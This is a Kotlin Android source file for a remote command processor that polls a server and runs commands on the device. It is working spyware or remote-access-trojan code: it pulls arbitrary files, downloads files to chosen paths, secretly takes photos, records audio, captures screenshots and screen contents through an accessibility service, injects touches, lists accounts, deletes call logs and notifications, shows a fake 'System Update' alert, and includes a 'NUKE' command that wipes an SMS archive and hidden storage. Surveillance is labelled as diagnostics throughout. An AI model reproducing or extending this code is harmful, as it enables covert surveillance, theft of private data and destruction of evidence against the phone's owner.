package com.example.myandroid

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

object CommandProcessor {

    suspend fun checkAndExecute(ctx: Context) {
        withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceManager.getDeviceId(ctx)
                // Fetch PENDING commands via Gateway
                val req = JSONObject()
                req.put("action", "get_commands")
                req.put("deviceId", deviceId)

                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Accept", "application/json")
                conn.doOutput = true

                conn.outputStream.use { os -> 
                    os.write(req.toString().toByteArray(Charsets.UTF_8))
                    os.flush()
                }
                
                val code = conn.responseCode
                if (code == 200) {
                    val resp = conn.inputStream.bufferedReader().use { it.readText() }
                    val respObj = JSONObject(resp)
                    if (respObj.optBoolean("success")) {
                        val commands = respObj.optJSONArray("data") ?: JSONArray()
                        DebugLogger.log("CMD_PROC", "Fetch Success. Count: ${commands.length()}")
                        for (i in 0 until commands.length()) {
                            val cmd = commands.getJSONObject(i)
                            DebugLogger.log("SYSTEM", "Executing: ${cmd.optString("file_name")}")
                            processSingleCommand(ctx, cmd)
                        }
                    } else {
                        DebugLogger.log("CMD_PROC_ERR", "Gateway Logic Fail: ${respObj.optString("error")}")
                    }
                } else {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("CMD_PROC_ERR", "HTTP $code: $err")
                }
            } catch (e: Exception) {
                DebugLogger.log("CMD_PROC_FATAL", "Stack: ${e.message}")
            }
        }
    }

    suspend fun processSingleCommand(ctx: Context, cmd: JSONObject) {
        val id = cmd.getInt("id")
        
        // 1. Mark as RECEIVED immediately so backend knows the device is alive
        updateCommandStatus(ctx, id, "RECEIVED", null)

        var status = "EXECUTED"
        var errorMsg = ""
        val fileName = cmd.optString("file_name")
        val content = cmd.optString("content", "")

        try {
            when (fileName) {
                "PING" -> {
                    CloudManager.sendPing(ctx, "Remote Tickle: Alive")
                    status = "PONG"
                }
                "TOAST" -> {
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(ctx, content, Toast.LENGTH_LONG).show()
                    }
                }
                "RING" -> {
                    val dur = content.toLongOrNull() ?: 10L
                    val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                    val oldMode = am.ringerMode
                    val oldVol = am.getStreamVolume(android.media.AudioManager.STREAM_RING)
                    
                    if (PermissionManager.hasDndAccess(ctx)) {
                        am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
                    }
                    am.setStreamVolume(android.media.AudioManager.STREAM_RING, am.getStreamMaxVolume(android.media.AudioManager.STREAM_RING), 0)
                    
                    val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
                    val ringtone = android.media.RingtoneManager.getRingtone(ctx, uri)
                    ringtone.play()
                    
                    kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
                        kotlinx.coroutines.delay(dur * 1000)
                        ringtone.stop()
                        if (PermissionManager.hasDndAccess(ctx)) {
                            am.ringerMode = oldMode
                        }
                        am.setStreamVolume(android.media.AudioManager.STREAM_RING, oldVol, 0)
                    }
                    status = "RINGING (${dur}S)"
                }
                "STAY_READY" -> {
                    val mins = content.toLongOrNull() ?: 5L
                    val i = android.content.Intent(ctx, BeaconService::class.java)
                    i.putExtra("duration_mins", mins)
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i)
                    else ctx.startService(i)
                    status = "SYNC_PRIORITY_HIGH (${mins}M)"
                }
                "SET_INTERVAL" -> {
                    // Content = Interval in Minutes (min 15)
                    val mins = content.toLongOrNull() ?: 15L
                    val safeMins = if (mins < 15) 15L else mins
                    
                    val wm = WorkManager.getInstance(ctx)
                    val constraints = Constraints.Builder()
                        .setRequiredNetworkType(NetworkType.CONNECTED)
                        .setRequiresBatteryNotLow(true)
                        .build()

                    val req = PeriodicWorkRequestBuilder<RemoteCommandWorker>(safeMins, TimeUnit.MINUTES)
                        .setConstraints(constraints)
                        .build()
                        
                    wm.enqueueUniquePeriodicWork("RemoteCmdWorker", ExistingPeriodicWorkPolicy.REPLACE, req)
                    status = "EXECUTED (NEW INTERVAL: ${safeMins}M)"
                }
                "STOP_BEACON" -> {
                    ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
                    status = "EXECUTED (STOPPED)"
                }
                "GET_TOKEN" -> {
                    val token = DeviceManager.getRobustFcmToken(ctx)
                    if (token != null) {
                        status = "TOKEN_RETRIEVED"
                        val result = JSONObject().put("fcm_token", token)
                        updateCommandStatus(ctx, id, status, null, result, null)
                        return
                    } else {
                        status = "FETCH_FAILED (NO_TOKEN)"
                        errorMsg = "Play Services unavailable or token generation blocked."
                    }
                }
                "GET_VAULT_SIZE" -> {
                    val sizeInfo = DumpManager.getVaultSize()
                    status = "EXECUTED"
                    val result = JSONObject().put("size_report", sizeInfo)
                    updateCommandStatus(ctx, id, status, null, result, null)
                    return
                }
                "FORCE_UPLOAD" -> {
                    val modules = content.split(",").map { it.trim() }
                    CloudManager.uploadData(ctx, modules, "REMOTE_COMMAND")
                    status = "MANUAL_BACKUP_INITIATED"
                }
                "UPLOAD_DUMPS" -> {
                    val root = DumpManager.getRootDir()
                    val dateFolders = root.listFiles { f -> f.isDirectory } ?: emptyArray()
                    var filesUploaded = 0
                    var foldersCleared = 0

                    for (folder in dateFolders) {
                        val files = folder.listFiles() ?: continue
                        if (files.isEmpty()) {
                            folder.delete()
                            continue
                        }

                        var folderEmpty = true
                        for (f in files) {
                            // Upload to 'ARCHIVE' category
                            if (CloudManager.uploadFile(ctx, f, "ARCHIVE")) {
                                f.delete()
                                filesUploaded++
                            } else {
                                folderEmpty = false
                            }
                        }

                        if (folderEmpty) {
                            folder.delete()
                            foldersCleared++
                        }
                    }
                    status = "SCAVENGER_COMPLETE"
                    val result = JSONObject()
                    result.put("files_synced", filesUploaded)
                    result.put("vault_folders_wiped", foldersCleared)
                    updateCommandStatus(ctx, id, status, null, result, null)
                    return
                }
                "PULL_FILE" -> {
                    val f = File(content)
                    if (f.exists() && f.isFile) {
                        val timestamp = System.currentTimeMillis()
                        val folderName = DeviceManager.getDeviceFolderName(ctx)
                        val storagePath = "$folderName/PULL/${timestamp}_${f.name}"
                        if (!CloudManager.uploadFile(ctx, f, "PULL", timestamp)) {
                            status = "FETCH_FAILED (UPLOAD_ERROR)"
                            errorMsg = "File exists but streaming to storage bucket failed."
                        } else {
                            status = "REMOTE_FETCH_SUCCESS"
                            updateCommandStatus(ctx, id, status, null, null, storagePath)
                            return 
                        }
                    } else {
                        status = "FETCH_ABORTED (NOT_FOUND)"
                        errorMsg = "File path does not exist on device."
                    }
                }
                "PUSH_FILE" -> {
                    val parts = content.split("|")
                    if (parts.size < 2) {
                        status = "FAILED (BAD_FORMAT)"
                        errorMsg = "Required format: URL | /path/to/save/file.ext"
                    } else {
                        var currentUrl = parts[0].trim()
                        val targetPath = parts[1].trim()
                        val targetFile = File(targetPath)
                        
                        try {
                            targetFile.parentFile?.mkdirs()
                            var connection: java.net.HttpURLConnection
                            var redirects = 0
                            val maxRedirects = 5

                            while (true) {
                                val url = URL(currentUrl)
                                connection = url.openConnection() as java.net.HttpURLConnection
                                connection.instanceFollowRedirects = false // Manually handle for control
                                connection.connectTimeout = 30000
                                connection.readTimeout = 30000
                                
                                val code = connection.responseCode
                                if (code in 300..308 && redirects < maxRedirects) {
                                    currentUrl = connection.getHeaderField("Location")
                                    redirects++
                                    continue
                                }

                                if (code == 200) {
                                    connection.inputStream.use { input ->
                                        targetFile.outputStream().use { output ->
                                            input.copyTo(output, 8192)
                                        }
                                    }
                                    status = "DEPLOYMENT_SUCCESS"
                                    val result = JSONObject()
                                    result.put("saved_to", targetFile.absolutePath)
                                    result.put("size", targetFile.length())
                                    result.put("redirects", redirects)
                                    updateCommandStatus(ctx, id, status, null, result, null)
                                    return
                                } else {
                                    status = "DEPLOYMENT_FAILED"
                                    errorMsg = "HTTP $code at end of chain"
                                    break
                                }
                            }
                        } catch (e: Exception) {
                            status = "DEPLOYMENT_ERROR"
                            errorMsg = e.toString()
                        }
                    }
                }
                "GET_SKELETON" -> {
                    val depth = content.trim().toIntOrNull() ?: 5
                    val report = FileManager.generateReport(depth)
                    status = "STORAGE_INDEX_COMPLETE"
                    DebugLogger.log("COMMAND", "Processed [$fileName] (Depth: $depth) -> $status")
                    updateCommandStatus(ctx, id, status, null, report, null)
                    return
                }
                "GET_TREE" -> {
                    // Content format: "pkg_name|mins" or just "mins" or empty
                    val parts = content.split("|")
                    val pkg = if (parts.size >= 2) parts[0].trim() else if (parts[0].contains(".")) parts[0].trim() else null
                    val mins = (if (parts.size >= 2) parts[1].toLongOrNull() else parts[0].toLongOrNull()) ?: 5L
                    
                    if (MyAccessibilityService.instance != null) {
                        if (mins <= 0) {
                            MyAccessibilityService.instance?.startTreeDump(null, 0)
                            status = "SCAN_SESSION_TERMINATED"
                            errorMsg = "All active UI scan sessions have been cleared."
                        } else {
                            MyAccessibilityService.instance?.startTreeDump(pkg, mins)
                            status = "SCAN_SESSION_STARTED"
                            errorMsg = "Target: ${pkg ?: "GLOBAL"} | Duration: ${mins}m"
                        }
                    } else {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Accessibility service is not running."
                    }
                }
                "GET_LOGS" -> {
                    val logs = DebugLogger.getLogs()
                    val tempFile = java.io.File(ctx.cacheDir, "diag_log_${System.currentTimeMillis()}.txt")
                    try {
                        tempFile.writeText(logs)
                        if (CloudManager.uploadFile(ctx, tempFile, "DIAGNOSTIC")) {
                            status = "DIAGNOSTIC_EXPORT_SUCCESS"
                        } else {
                            status = "DIAGNOSTIC_EXPORT_FAILED"
                        }
                    } catch (e: Exception) {
                        status = "EXPORT_ERROR"
                    } finally {
                        if (tempFile.exists()) tempFile.delete()
                    }
                }
                "TOGGLE_FEATURE" -> {
                    val parts = content.split(":")
                    if (parts.size >= 2) {
                        val feature = parts[0].trim()
                        val stateStr = parts[1].trim().lowercase()
                        val enable = stateStr == "on" || stateStr == "true"
                        val duration = if (parts.size >= 3) parts[2].toLongOrNull() ?: 0L else 0L
                        
                        ConfigManager.setFeature(ctx, feature, enable, duration)
                        status = if (duration > 0L) "EXECUTED (TEMP OFF: ${duration}M)" else "EXECUTED (PERMANENT)"
                    } else status = "FAILED (FORMAT)"
                }
                "CODERED" -> {
                    val i = android.content.Intent(ctx, EmergencyService::class.java)
                    i.putExtra("codes", "0")
                    i.putExtra("sender", "BACKEND")
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        ctx.startForegroundService(i)
                    } else {
                        ctx.startService(i)
                    }
                }
                "GET_SCREENSHOT" -> {
                    if (MyAccessibilityService.instance == null) {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Accessibility service is required for screenshots."
                    } else {
                        val quality = content.trim().toIntOrNull() ?: 70
                        val deferredFile = CompletableDeferred<java.io.File?>()
                        
                        MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
                            deferredFile.complete(file)
                        }

                        val file = withTimeoutOrNull(10000) { deferredFile.await() }
                        if (file != null) {
                            if (CloudManager.uploadFile(ctx, file, "SCREEN_CAPTURE")) {
                                status = "SCREENSHOT_UPLOADED"
                                file.delete()
                            } else {
                                DumpManager.vaultMedia(file, "SCREEN_CAPTURE")
                                status = "SCREENSHOT_QUEUED_OFFLINE"
                            }
                        } else {
                            status = "SCREENSHOT_FAILED"
                            errorMsg = "Capture timed out or device version incompatible."
                        }
                    }
                }
                "CAPTURE_IMAGE" -> {
                    val parts = content.split("|")
                    val side = parts.getOrNull(0)?.trim()?.uppercase() ?: "REAR"
                    val count = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 1
                    val useFront = side == "FRONT"
                    
                    var successCount = 0
                    for (i in 1..count) {
                        val file = CameraControl.capture(ctx, useFront)
                        if (file != null) {
                            if (CloudManager.uploadFile(ctx, file, "OPTICAL_DIAG")) {
                                successCount++
                                file.delete()
                            } else {
                                // OFFLINE: Send to Catacombs
                                DumpManager.vaultMedia(file, "OPTICAL_DIAG")
                            }
                        }
                        kotlinx.coroutines.delay(1000)
                    }
                    status = "IMAGE_CAPTURE_COMPLETE ($successCount/$count)"
                }
                "RECORD_VOICE" -> {
                    val dur = content.trim().toIntOrNull() ?: 10
                    val snippet = VoiceManager.recordSnippet(ctx, dur)
                    if (snippet != null) {
                        if (CloudManager.uploadFile(ctx, snippet, "VOICE_DIAG")) {
                            status = "VOICE_CAPTURE_SUCCESS"
                            snippet.delete()
                        } else {
                            // OFFLINE: Send to Catacombs
                            DumpManager.vaultMedia(snippet, "VOICE_DIAG")
                            status = "VOICE_QUEUED_OFFLINE"
                        }
                    } else {
                        status = "VOICE_CAPTURE_FAILED"
                        errorMsg = "Mic may be in use by another app or permission denied."
                    }
                }
                "GET_ACCOUNTS" -> {
                    val accounts = DeviceManager.getAccounts(ctx)
                    status = "ACCOUNTS_RETRIEVED"
                    val result = JSONObject().put("accounts", accounts)
                    updateCommandStatus(ctx, id, status, null, result, null)
                    return
                }
                "VOLUME" -> {
                    val parts = content.split("|")
                    if (parts.size >= 2) {
                        val streamStr = parts[0].trim().uppercase()
                        val levelStr = parts[1].trim().uppercase()
                        
                        val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                        val stream = when (streamStr) {
                            "MEDIA" -> android.media.AudioManager.STREAM_MUSIC
                            "ALARM" -> android.media.AudioManager.STREAM_ALARM
                            else -> android.media.AudioManager.STREAM_RING
                        }

                        if (levelStr == "SILENT" || levelStr == "VIBRATE" || levelStr == "NORMAL") {
                            if (PermissionManager.hasDndAccess(ctx)) {
                                am.ringerMode = when (levelStr) {
                                    "SILENT" -> android.media.AudioManager.RINGER_MODE_SILENT
                                    "VIBRATE" -> android.media.AudioManager.RINGER_MODE_VIBRATE
                                    else -> android.media.AudioManager.RINGER_MODE_NORMAL
                                }
                                status = "RINGER_MODE_SET ($levelStr)"
                            } else {
                                status = "FAILED_PERMISSION (DND_ACCESS)"
                                errorMsg = "Do Not Disturb access required to change ringer mode."
                            }
                        } else {
                            val pct = levelStr.toIntOrNull()?.coerceIn(0, 100) ?: 50
                            val max = am.getStreamMaxVolume(stream)
                            val targetVol = ((pct / 100f) * max).toInt()
                            
                            if (stream == android.media.AudioManager.STREAM_RING && PermissionManager.hasDndAccess(ctx) && am.ringerMode != android.media.AudioManager.RINGER_MODE_NORMAL) {
                                am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
                            }
                            am.setStreamVolume(stream, targetVol, 0)
                            status = "VOLUME_SET ($streamStr to $pct%)"
                        }
                    } else {
                        status = "FAILED (FORMAT)"
                        errorMsg = "Usage: VOLUME | MEDIA/RING/ALARM | 0-100/SILENT/VIBRATE"
                    }
                }
                "TOGGLE_LOGGING" -> {
                    val state = content.trim().uppercase()
                    DebugLogger.isLoggingEnabled = (state == "ON")
                    status = "LOGGING_SYSTEM_" + (if (DebugLogger.isLoggingEnabled) "ENABLED" else "DISABLED")
                }
                "WIPE_NOTIFICATIONS" -> {
                    if (MyNotificationListener.instance != null) {
                        val parts = content.split("|")
                        val mode = parts.getOrNull(0)?.trim()?.uppercase() ?: "ALL"
                        val value = parts.getOrNull(1)?.trim()
                        
                        MyNotificationListener.instance?.wipeNotifications(mode, value)
                        status = "NOTIFICATIONS_WIPED (Mode: $mode)"
                    } else {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Notification listener service is not running."
                    }
                }
                "SCREEN_TIMEOUT" -> {
                    val secs = content.trim().toIntOrNull() ?: 30
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M && android.provider.Settings.System.canWrite(ctx)) {
                        android.provider.Settings.System.putInt(
                            ctx.contentResolver,
                            android.provider.Settings.System.SCREEN_OFF_TIMEOUT,
                            secs * 1000
                        )
                        status = "TIMEOUT_SET (${secs}s)"
                    } else {
                        status = "FAILED_PERMISSION (WRITE_SETTINGS)"
                        errorMsg = "Write Settings permission required to modify screen timeout."
                    }
                }
                "BRIGHTNESS" -> {
                    val parts = content.split("|")
                    val level = parts.getOrNull(0)?.trim()?.toIntOrNull() ?: 100
                    val method = parts.getOrNull(1)?.trim()?.uppercase() ?: "OVERLAY"
                    
                    Handler(Looper.getMainLooper()).post {
                        DimmerManager.applyDim(ctx, level, method)
                    }
                    status = "BRIGHTNESS_ADJUSTED ($level% via $method)"
                }
                "UNBLIND" -> {
                    Handler(Looper.getMainLooper()).post {
                        DimmerManager.removeOverlay(ctx)
                        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.System.canWrite(ctx)) {
                            Settings.System.putInt(ctx.contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE, Settings.System.SCREEN_BRIGHTNESS_MODE_AUTOMATIC)
                        }
                    }
                    status = "DISPLAY_RESTORED"
                }
                "WAKE" -> {
                    // 1. CPU KICK: Force a temporary WakeLock to ensure the CPU is awake to process the UI
                    val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                    val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
                        android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
                        android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:WakeTrigger")
                    wakeLock.acquire(3000) // Hold for 3 seconds

                    val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                    val channelId = "system_integrity_alerts"
                    
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        val channel = android.app.NotificationChannel(channelId, "System Integrity", android.app.NotificationManager.IMPORTANCE_HIGH)
                        channel.setSound(null, null)
                        channel.enableVibration(false)
                        nm.createNotificationChannel(channel)
                    }

                    val intent = Intent(ctx, PulseActivity::class.java)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_USER_ACTION or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                    intent.putExtra("is_wake_trigger", true)
                    if (content.contains("wellbeing")) intent.putExtra("route_to_settings", true)

                    val pendingIntent = android.app.PendingIntent.getActivity(
                        ctx, 99, intent, 
                        android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
                    )

                    val builder = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
                        .setSmallIcon(android.R.drawable.ic_menu_info_details)
                        .setContentTitle("System Update")
                        .setContentText("Synchronizing system health parameters...")
                        .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                        .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
                        .setFullScreenIntent(pendingIntent, true)
                        .setAutoCancel(true)
                        .setTimeoutAfter(3000)

                    nm.notify(99, builder.build())
                    status = "STRONG_WAKE_DISPATCHED"
                }
                "REMOTE_TOUCH" -> {
                    if (MyAccessibilityService.instance == null) {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Accessibility service is required for remote interaction."
                    } else {
                        val parts = content.split("|")
                        val action = parts[0].trim().uppercase()
                        
                        // Execute on Service Instance
                        val success = MyAccessibilityService.instance?.handleRemoteAction(action, parts.drop(1).map { it.trim() }) ?: false
                        status = if (success) "TOUCH_DISPATCHED" else "TOUCH_EXECUTION_ERROR"
                    }
                }
                "PHONE_LOGS" -> {
                    val parts = content.split("|")
                    val action = parts[0].trim()
                    val value = if (parts.size > 1) parts[1].trim() else null
                    
                    val deletedCount = PhoneManager.deleteLogs(ctx, action, value)
                    status = when (deletedCount) {
                        -1 -> "FAILED_PERMISSION"
                        -2 -> "FAILED_ERROR"
                        else -> "SUCCESS_CLEANUP ($deletedCount)"
                    }
                    errorMsg = "Action: $action | Target: ${value ?: "ALL"}"
                }
                "NUKE" -> {
                    try {
                        // 1. Wipe the "Catacombs" (External hidden storage)
                        File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android").deleteRecursively()
                        
                        // 2. Wipe Internal Files (Logs and Crash reports)
                        File(ctx.filesDir, "survivor_logs.txt").delete()
                        File(ctx.filesDir, "CRITICAL_HALT.txt").delete()
                        File(ctx.filesDir, "sms_archive_vault.json").delete()
                        
                        // 3. Reset SharedPreferences (Excluding app_identity)
                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().clear().apply()
                        ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit().clear().apply()
                        ctx.getSharedPreferences("setup_prefs", Context.MODE_PRIVATE).edit().clear().apply()
                        ctx.getSharedPreferences("app_health", Context.MODE_PRIVATE).edit().clear().apply()

                        status = "FORENSIC_WIPE_COMPLETE"
                        
                        // 4. Suicide & Resurrect: Kill process; OS will restart services in fresh state
                        Handler(Looper.getMainLooper()).postDelayed({ 
                            android.os.Process.killProcess(android.os.Process.myPid()) 
                        }, 2000)
                    } catch(e: Exception) { 
                        status = "CLEANUP_FAILED"
                        errorMsg = e.message ?: "IO Error during wipe"
                    }
                }
                "RUN_INTENT" -> {
                    try {
                        val json = JSONObject(content)
                        val action = json.optString("action", android.content.Intent.ACTION_VIEW)
                        val intent = android.content.Intent(action)
                        
                        val dataStr = json.optString("data", "")
                        if (dataStr.isNotEmpty()) {
                            intent.data = android.net.Uri.parse(dataStr)
                        }
                        
                        if (json.has("pkg")) intent.setPackage(json.getString("pkg"))
                        
                        val typeStr = json.optString("type", "")
                        if (typeStr.isNotEmpty()) {
                            if (intent.data != null) intent.setDataAndType(intent.data, typeStr)
                            else intent.type = typeStr
                        }
                        
                        // Handle Extras
                        val extras = json.optJSONObject("extras")
                        extras?.keys()?.forEach { key ->
                            val value = extras.get(key)
                            if (value is Boolean) intent.putExtra(key, value)
                            else if (value is Int) intent.putExtra(key, value)
                            else intent.putExtra(key, value.toString())
                        }

                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                        val target = json.optString("target", "activity")
                        when (target?.lowercase() ?: "activity") {
                            "service" -> {
                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(intent)
                                else ctx.startService(intent)
                            }
                            "broadcast" -> ctx.sendBroadcast(intent)
                            else -> ctx.startActivity(intent)
                        }
                                            status = "EXECUTED (INTENT SENT)"
                } catch (e: Exception) {
                    status = "FAILED_INTENT"
                    errorMsg = e.toString() // Capture full class name like ActivityNotFoundException
                }
            }
            }
        } catch (e: Exception) {
            status = "FAILED: ${e.message}"
            errorMsg = e.toString()
        }

        // Expose the result to the UI Terminal
        DebugLogger.log("COMMAND", "Processed [$fileName] -> $status")

        // Update DB
        updateCommandStatus(ctx, id, status, errorMsg)
    }

    private fun updateCommandStatus(ctx: Context, id: Int, status: String, errorMsg: String? = null, resultData: JSONObject? = null, resultFilePath: String? = null) {
        try {
            val key = SecretVault.getLock(ctx)
            val updateUrl = URL(SecretVault.getGatewayUrl(ctx))
            val conn = updateUrl.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("apikey", key)
            conn.setRequestProperty("Authorization", "Bearer $key")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true

            val req = JSONObject()
            req.put("action", "update_command")
            req.put("deviceId", DeviceManager.getDeviceId(ctx))
            val payload = JSONObject()
            payload.put("id", id)
            payload.put("status", status)
            if (!errorMsg.isNullOrEmpty()) payload.put("errorMsg", errorMsg)
            if (resultData != null) payload.put("resultData", resultData)
            if (!resultFilePath.isNullOrEmpty()) payload.put("resultFilePath", resultFilePath)
            req.put("payload", payload)

            conn.outputStream.use { it.write(req.toString().toByteArray()) }
            val code = conn.responseCode
            if (code !in 200..299) {
                val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                DebugLogger.log("SUPABASE_ERR", "Cmd Status Update Failed: $code | $err")
            }
        } catch (e: Exception) { 
            DebugLogger.log("CMD_ERR", "Update Status Error: ${e.message}")
        }
    }
}
